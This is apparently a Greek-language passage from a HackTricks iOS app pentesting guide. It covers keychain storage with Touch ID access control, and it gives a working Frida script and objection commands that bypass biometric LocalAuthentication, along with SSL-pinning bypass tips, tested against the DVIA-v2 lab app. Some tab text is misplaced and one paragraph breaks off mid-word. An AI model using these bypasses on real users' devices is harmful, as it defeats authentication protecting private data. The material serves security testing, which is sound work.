Παρακάτω υπάρχουν παραδείγματα κώδικα σε Swift και Objective-C που δείχνουν πώς να αποθηκεύσετε και να ανακτήσετε ένα συμβολοσειρά από/προς το keychain, εκμεταλλευόμενοι αυτά τα χαρακτηριστικά ασφαλείας. Τα παραδείγματα δείχνουν ειδικά πώς να ρυθμίσετε τον έλεγχο πρόσβασης για να απαιτεί αυθεντικοποίηση Touch ID και να διασφαλίζετε ότι τα δεδομένα είναι προσβάσιμα μόνο στη συσκευή όπου ρυθμίστηκαν, υπό την προϋπόθεση ότι ένας κωδικός πρόσβασης συσκευής είναι διαμορφωμένος.

{% tabs %}
{% tab title="Swift" %}
```swift
// From https://github.com/mufambisi/owasp-mstg/blob/master/Document/0x06f-Testing-Local-Authentication.md

// 1. create AccessControl object that will represent authentication settings

var error: Unmanaged<CFError>?

guard let accessControl = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
SecAccessControlCreateFlags.biometryCurrentSet,
&error) else {
// failed to create AccessControl object

return
}

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute

var query: [String: Any] = [:]

query[kSecClass as String] = kSecClassGenericPassword
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecAttrAccount as String] = "OWASP Account" as CFString
query[kSecValueData as String] = "test_strong_password".data(using: .utf8)! as CFData
query[kSecAttrAccessControl as String] = accessControl

// 3. save item

let status = SecItemAdd(query as CFDictionary, nil)

if status == noErr {
// successfully saved
} else {
// error while saving
}
```
{% endtab %}

{% tab title="Objective-C" %}Η Objective-C είναι η γλώσσα προγραμματισμού που χρησιμοποιείται κυρίως για την ανάπτυξη εφαρμογύν iOS. Κατά τη διάρκεια της δοκιμής ασφάλειας iOS, θα χρειαστεί να εξετάσετε τον κώδικα Objective-C για πιθανές ευπάθειες ασφάλειας.{% endtab %}
```objectivec
// 1. create AccessControl object that will represent authentication settings
CFErrorRef *err = nil;

SecAccessControlRef sacRef = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
kSecAccessControlUserPresence,
err);

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute
NSDictionary* query = @{
(_ _bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecAttrAccount: @"OWASP Account",
(__bridge id)kSecValueData: [@"test_strong_password" dataUsingEncoding:NSUTF8StringEncoding],
(__bridge id)kSecAttrAccessControl: (__bridge_transfer id)sacRef
};

// 3. save item
OSStatus status = SecItemAdd((__bridge CFDictionaryRef)query, nil);

if (status == noErr) {
// successfully saved
} else {
// error while saving
}
```
{% endtab %}
{% endtabs %}

Τώρα μπορούμε να ζητήσουμε το αποθηκευμένο στοιχείο από το keychain. Οι υπηρεσίες keychain θα εμφανίσουν το παράθυρο ελέγχου ταυτότητας στον χρήστη και θα επιστρέψουν δεδομένα ή nil ανάλογα με το αν παρέχθηκε κατάλληλο δακτυλικό αποτύπωμα ή όχι.
```swift
// 1. define query
var query = [String: Any]()
query[kSecClass as String] = kSecClassGenericPassword
query[kSecReturnData as String] = kCFBooleanTrue
query[kSecAttrAccount as String] = "My Name" as CFString
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecUseOperationPrompt as String] = "Please, pass authorisation to enter this area" as CFString

// 2. get item
var queryResult: AnyObject?
let status = withUnsafeMutablePointer(to: &queryResult) {
SecItemCopyMatching(query as CFDictionary, UnsafeMutablePointer($0))
}

if status == noErr {
let password = String(data: queryResult as! Data, encoding: .utf8)!
// successfully received password
} else {
// authorization not passed
}
```
{% endtab %}

{% tab title="Objective-C" %}Η ανάλυση της εφαρμογής iOS μπορεί να γίνει χρησιμοποιώντας το εργαλείο `class-dump`. Αυτό το εργαλείο εξάγει πληροφορίες για τις κλάσεις, τις μεθόδους και τις μεταβλητές που χρησιμοποιούνται στην εφαρμογή. Με αυτές τις πληροφορίες, μπορείτε να κατανοήσετε καλύτερα τη λειτουργία της εφαρμογής και να εντοπίσετε πιθανά σημεία ευπάθειας που μπορούν να εκμεταλλευτούν κακόβουλοι χρήστες.{% endtab %}
```objectivec
// 1. define query
NSDictionary *query = @{(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecAttrAccount: @"My Name1",
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecUseOperationPrompt: @"Please, pass authorisation to enter this area" };

// 2. get item
CFTypeRef queryResult = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, &queryResult);

if (status == noErr){
NSData* resultData = ( __bridge_transfer NSData* )queryResult;
NSString* password = [[NSString alloc] initWithData:resultData encoding:NSUTF8StringEncoding];
NSLog(@"%@", password);
} else {
NSLog(@"Something went wrong");
}
```
### Ανίχνευση

Η χρήση πλαισίων (frameworks) σε μια εφαρμογή μπορεί επίσης να ανιχνευθεί αναλύοντας τη λίστα των κοινών δυναμικών βιβλιοθηκών του δυαδικού αρχείου της εφαρμογής. Αυτό μπορεί να γίνει χρησιμοποιώντας το `otool`:
```bash
$ otool -L <AppName>.app/<AppName>
```
Εάν χρησιμοποιείται το `LocalAuthentication.framework` σε μια εφαρμογή, το αποτέλεσμα θα περιέχει και τις παρακάτω γραμμές (να θυμάστε ότι το `LocalAuthentication.framework` χρησιμοποιεί το `Security.framework` κάτω από το καπάκι):
```bash
/System/Library/Frameworks/LocalAuthentication.framework/LocalAuthentication
/System/Library/Frameworks/Security.framework/Security
```
Εάν χρησιμοποιείται το `Security.framework`, θα εμφανιστεί μόνο το δεύτερο.

### Διασχίζοντας το Πλαίσιο Τοπικής Ταυτοποίησης

#### **Αντίρρηση**

Μέσω της **Αντίρρησης Βιομετρικών Δεδομένων**, που βρίσκεται στη [σελίδα GitHub αυτή](https://github.com/sensepost/objection/wiki/Understanding-the-iOS-Biometrics-Bypass), είναι διαθέσιμη μια τεχνική για την αντιμετώπιση του μηχανισμού **LocalAuthentication**. Το πυρήνας αυτής της προσέγγισης περιλαμβάνει την εκμετάλλευση του **Frida** για την τροποποίηση της λειτουργίας `evaluatePolicy`, εξασφαλίζοντας ότι πάντα επιστρέφει ένα αποτέλεσμα `True`, ανεξαρτήτως της πραγματικής επιτυχίας της ταυτοποίησης. Αυτό είναι ιδιαίτερα χρήσιμο για την παράκαμψη ελαττωματικών διαδικασιών βιομετρικής ταυτοποίησης.

Για την ενεργοποίηση αυτής της παράκαμψης, χρησιμοποιείται η ακόλουθη εντολή:
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios ui biometrics_bypass
(agent) Registering job 3mhtws9x47q. Type: ios-biometrics-disable
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # (agent) [3mhtws9x47q] Localized Reason for auth requirement: Please authenticate yourself
(agent) [3mhtws9x47q] OS authentication response: false
(agent) [3mhtws9x47q] Marking OS response as True instead
(agent) [3mhtws9x47q] Biometrics bypass hook complete
```
Αυτή η εντολή ενεργοποιεί μια ακολουθία όπου το Objection καταχωρίζει μια εργασία που αλλάζει αποτελεσματικά το αποτέλεσμα του ελέγχου `evaluatePolicy` σε `True`.

#### Frida

Ένα παράδειγμα χρήσης του **`evaluatePolicy`** από την εφαρμογή [DVIA-v2](https://github.com/prateek147/DVIA-v2):
```swift
+(void)authenticateWithTouchID {
LAContext *myContext = [[LAContext alloc] init];
NSError *authError = nil;
NSString *myLocalizedReasonString = @"Please authenticate yourself";

if ([myContext canEvaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics error:&authError]) {
[myContext evaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics
localizedReason:myLocalizedReasonString
reply:^(BOOL success, NSError *error) {
if (success) {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Successful" withTitle:@"Success"];
});
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Failed !" withTitle:@"Error"];
});
}
}];
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Your device doesn't support Touch ID or you haven't configured Touch ID authentication on your device" withTitle:@"Error"];
});
}
}
```
Για να επιτευχθεί η **παράκαμψη** της Τοπικής Ταυτοποίησης, γράφεται ένα σενάριο Frida. Αυτό το σενάριο στοχεύει τον έλεγχο **evaluatePolicy**, παρεμβαίνοντας στην κλήση του για να διασφαλίσει ότι επιστρέφει **success=1**. Αλλάζοντας τη συμπεριφορά της κλήσης, ο έλεγχος ταυτοποίησης παρακάμπτεται αποτελεσματικά.

Το παρακάτω σενάριο ενσωματώνεται για να τροποποιήσει το αποτέλεσμα της μεθόδου **evaluatePolicy**. Αλλάζει το αποτέλεσμα της κλήσης για να υποδεικνύει πάντα επιτυχία.
```swift
// from https://securitycafe.ro/2022/09/05/mobile-pentesting-101-bypassing-biometric-authentication/
if(ObjC.available) {
console.log("Injecting...");
var hook = ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];
Interceptor.attach(hook.implementation, {
onEnter: function(args) {
var block = new ObjC.Block(args[4]);
const callback = block.implementation;
block.implementation = function (error, value)  {

console.log("Changing the result value to true")
const result = callback(1, null);
return result;
};
},
});
} else {
console.log("Objective-C Runtime is not available!");
}
```
Για να ενθέσετε το σενάριο του Frida και να παρακάμψετε τη βιομετρική ταυτοποίηση, χρησιμοποιείται η παρακάτω εντολή:
```bash
frida -U -f com.highaltitudehacks.DVIAswiftv2 --no-pause -l fingerprint-bypass-ios.js
```
## Εκθέτοντας Ευαίσθητες Λειτουργίες Μέσω IPC

### Προσαρμοσμένοι Χειριστές URI / Deeplinks / Προσαρμοσμένα Σχήματα

{% content-ref url="ios-custom-uri-handlers-deeplinks-custom-schemes.md" %}
[ios-custom-uri-handlers-deeplinks-custom-schemes.md](ios-custom-uri-handlers-deeplinks-custom-schemes.md)
{% endcontent-ref %}

### Κοινές Συνδέσεις

{% content-ref url="ios-universal-links.md" %}
[ios-universal-links.md](ios-universal-links.md)
{% endcontent-ref %}

### Διαμοιρασμός UIActivity

{% content-ref url="ios-uiactivity-sharing.md" %}
[ios-uiactivity-sharing.md](ios-uiactivity-sharing.md)
{% endcontent-ref %}

### UIPasteboard

{% content-ref url="ios-uipasteboard.md" %}
[ios-uipasteboard.md](ios-uipasteboard.md)
{% endcontent-ref %}

### Επεκτάσεις Εφαρμογών

{% content-ref url="ios-app-extensions.md" %}
[ios-app-extensions.md](ios-app-extensions.md)
{% endcontent-ref %}

### WebViews

{% content-ref url="ios-webviews.md" %}
[ios-webviews.md](ios-webviews.md)
{% endcontent-ref %}

### Σειριοποίηση και Κωδικοποίηση

{% content-ref url="ios-serialisation-and-encoding.md" %}
[ios-serialisation-and-encoding.md](ios-serialisation-and-encoding.md)
{% endcontent-ref %}

## Επικοινωνία Δικτύου

Είναι σημαντικό να ελέγχετε ότι δεν υπάρχει καμία επικοινωνία που να γίνεται **χωρίς κρυπτογράφηση** και επίσης ότι η εφαρμογή ελέγχει σωστά το **πιστοποιητικό TLS** του διακομιστή.\
Για να ελέγξετε αυτού του είδους τα θέματα, μπορείτε να χρησιμοποιήσετε ένα proxy όπως το **Burp**:

{% content-ref url="burp-configuration-for-ios.md" %}
[burp-configuration-for-ios.md](burp-configuration-for-ios.md)
{% endcontent-ref %}

### Έλεγχος Ονόματος Κεντρικού Υπολογιστή

Ένα κοινό πρόβλημα κατά τον έλεγχο του πιστοποιητικού TLS είναι να ελέγχετε αν το πιστοποιητικό υπογράφτηκε από ένα **αξιόπιστο** **Φορέα Πιστοποίησης (CA)**, αλλά να **μην ελέγχετε** αν **το όνομα του κεντρικού υπολογιστή** του πιστοποιητικού είναι το όνομα το οποίο προσπελαύνεται.\
Για να ελέγξετε αυτό το πρόβλημα χρησιμοποιώντας το Burp, μετά την εμπιστοποίηση του CA του Burp στο iPhone, μπορείτε να **δημιουργήσετε ένα νέο πιστοποιητικό με το Burp για ένα διαφορετικό όνομα κεντρικού υπολογιστή** και να το χρησιμοποιήσετε. Αν η εφαρμογή εξακολουθεί να λειτουργεί, τότε κάτι είναι ευάλωτο.

### Καρφίτσωμα Πιστοποιητικού

Εάν μια εφαρμογή χρησιμοποιεί σωστά το SSL Pinning, τότε η εφαρμογή θα λειτουργεί μόνο αν το πιστοποιητικό είναι αυτό που αναμένεται. Κατά τον έλεγχο μιας εφαρμογής **αυτό μπορεί να αποτελέσει πρόβλημα καθώς το Burp θα εξυπηρετεί το δικό του πιστοποιητικό.**\
Για να παρακάμψετε αυτήν την προστασία μέσα σε μια συσκευή με jailbreak, μπορείτε να εγκαταστήσετε την εφαρμογή [**SSL Kill Switch**](https://github.com/nabla-c0d3/ssl-kill-switch2) ή να εγκαταστήσετε το [**Burp Mobile Assistant**](https://portswigger.net/burp/documentation/desktop/mobile/config-ios-device)

Μπορείτε επίσης να χρησιμοποιήσετε την εντολή `ios sslpinning disable` του **objection**

## Διάφορα

* Στο **`/System/Library`** μπορείτε να βρείτε τα πλαίσια που έχουν εγκατασταθεί στο τηλέφωνο και χρησιμοποιούνται από τις εφαρμογές του συστήματος
* Οι εφαρμογές που έχει εγκαταστήσει ο χρήστης από το App Store βρίσκονται μέσα στο **`/User/Applications`**
* Και το **`/User/Library`** περιέχει δεδομένα που έχουν αποθηκευτεί από τις εφαρμογές επιπέδου χρήστη
* Μπορείτε να έχετε πρόσβαση στο **`/User/Library/Notes/notes.sqlite`** για να διαβάσετε τις σημειώσεις που έχουν αποθηκευτεί μέσα στην εφαρμογή.
* Μέσα στον φάκελο μιας εγκατεστημένης εφαρμογής (**`/User/Applications/<APP ID>/`**) μπορείτε να βρείτε μερικά ενδιαφέροντα αρχεία:
  * **`iTunesArtwork`**: Το εικονίδιο που χρησιμοποιεί η εφαρμογή
  * **`iTunesMetadata.plist`**: Πληροφορίες της εφαρμογής που χρησιμοποιούνται στο App Store
  * **`/Library/*`**: Περιέχει τις προτιμήσεις και την cache. Στο **`/Library/Cache/Snapshots/*`** μπορείτε να βρείτε το στιγμιότυπο που πραγματοποιήθηκε στην εφαρμογή πριν την στείλετε στο παρασκήνιο.

### Hot Patching/Επιβολή Ενημέρωσης

Οι προγραμματιστές μπορούν να ενημερώσουν απομακρυσμένα **όλες τις εγκαταστάσεις της εφαρμογής τους αμέσως** χωρίς να χρειάζεται να υποβάλουν ξανά την εφαρμογή στο App Store και να περιμένουν μέχρι να εγκριθεί.\
Για αυτό το σκοπό συνήθως χρησιμοποιείται το [**JSPatch**](https://github.com/bang590/JSPatch)**.** Αλλά υπάρχουν και άλλες επιλογές όπως το [Siren](https://github.com/ArtSabintsev/Siren) και το [react-native-appstore-version-checker](https://www.npmjs.com/package/react-native-appstore-version-checker).\
**Αυτός είναι ένας επικίνδυνος μηχανισμός που θα μπορούσε να καταχραστεί από κακόβουλα SDK τρίτων, επομένως συνιστάται να ελέγξετε ποια μέθοδος χρησιμοποιείται για την αυτόματη ενημέρωση (αν υπάρχει) και να τη δοκιμάσετε.** Μπορείτε να δοκιμάσετε να κατεβάσετε μια προηγούμενη έκδοση της εφαρμογής για αυτόν τον σκοπό.

### Τρίτοι

Ένα σημαντικό πρόβλημα με τα **SDK τρίτων** είναι η **έλλειψη λεπτομερούς ελέγχου** πάνω στις λειτουργίες τους. Οι προγραμματιστές αντιμετωπίζουν την επιλογή: είτε να ενσωματώσουν το SDK και να αποδεχτούν όλες τις λειτουργίες του, συμπεριλαμβανομένων πιθανών ευπαθειών ασφάλειας και ανησυχιών απορρήτου, είτε να απορρίψουν εντελώς τα οφέλη του. Συχνά, οι προγραμματιστές δεν μπορούν να επιδιορθώσουν τις ευπαθείς σημεία μέσα σε αυτά τα SDK μόνοι τους. Επιπλέον, καθώς τα SDK κερδίζουν εμπιστοσύνη στην κοινότητα, μερικά ενδέχεται να αρχίσουν να περιέχουν malware.

Οι υπηρεσίες που παρέχονται από SDK τρίτων μπορεί να περιλαμβάνουν παρακολούθηση συμπεριφοράς χρήστη, εμφάνιση διαφημίσεων ή βελτίωση της εμπειρίας χρήστη. Ωστόσο, αυτό εισάγει έναν κίνδυνο καθώς οι προγραμματιστές ενδέχεται να μην είναι πλήρως ενήμεροι για τον κώδικα που εκτελείται από αυτές τις βιβλιοθήκες, οδηγώντας σε πιθανούς κινδύνους απόρρητου και ασφάλειας. Είναι ζωτικής σημασίας να περιορίσετε τις πληροφορίες που μοιράζεστε με υπηρεσίες τρίτων σε αυτές που είναι απαραίτητες και να εξασφαλίσετε ότι δεν εκθέτετε ευαίσθητα δεδομένα.

Η υλοποίηση υπηρεσιών τρίτων έρχεται συνήθως σε δύο μορφές: ως ανεξάρτητη βιβ
```bash
otool -L <application_path>
```
## **Αναφορές & Περισσότεροι Πόροι**

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering)
* [iOS & Mobile App Pentesting - INE](https://my.ine.com/CyberSecurity/courses/089d060b/ios-mobile-app-pentesting)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0057/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0057/)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/)
* [https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage](https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage)
* [https://coderwall.com/p/kjb3lw/storing-password-in-keychain-the-smart-way](https://coderwall.com/p/kjb3lw/storing-password-in-keychain-the-smart-way)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0060/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0060/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060)
* [https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/](https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064](https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064)
* [https://medium.com/securing/bypassing-your-apps-biometric-checks-on-ios-c2555c81a2dc](https://medium.com/securing/bypassing-your-apps-biometric-checks-on-ios-c2555c81a2dc)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054)
* [https://github.com/ivRodriguezCA/RE-iOS-Apps/](https://github.com/ivRodriguezCA/RE-iOS-Apps/) IOS δωρεάν μάθημα([https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/](https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/))
* [https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577](https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577)
* [https://www.slideshare.net/RyanISI/ios-appsecurityminicourse](https://www.slideshare.net/RyanISI/ios-appsecurityminicourse)
* [https://github.com/prateek147/DVIA](https://github.com/prateek147/DVIA)
* [https://github.com/prateek147/DVIA-v2](https://github.com/prateek147/DVIA-v2)
* [https://github.com/OWASP/MSTG-Hacking-Playground%20](https://github.com/OWASP/MSTG-Hacking-Playground)
* OWASP iGoat [_https://github.com/OWASP/igoat_](https://github.com/OWASP/igoat) <<< Objective-C έκδοση [_https://github.com/OWASP/iGoat-Swift_](https://github.com/OWASP/iGoat-Swift) <<< Swift έκδοση
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/nabla-c0d3/ssl-kill-switch2](https://github.com/nabla-c0d3/ssl-kill-switch2)

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=ios-pentesting) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της παγκόσμιας κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=ios-pentesting" %}

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ σας υποβάλλοντας PRs** στα αποθετήρια του [**HackTricks**](https://github.com/carlospolop/hacktricks) και του [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
